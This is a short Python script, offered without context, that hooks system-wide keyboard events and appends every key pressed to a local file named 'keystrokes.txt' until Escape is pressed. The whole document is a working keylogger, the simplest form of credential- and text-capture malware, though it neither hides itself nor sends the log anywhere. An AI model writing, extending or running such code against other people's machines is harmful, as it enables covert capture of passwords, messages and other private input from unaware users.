import keyboard

filename = "keystrokes.txt"

def on_key_press(event):
    with open(filename, "a") as f:
        f.write(event.name + "\n")

keyboard.on_press(on_key_press)

# Run the script until the user presses the escape key
keyboard.wait("esc")
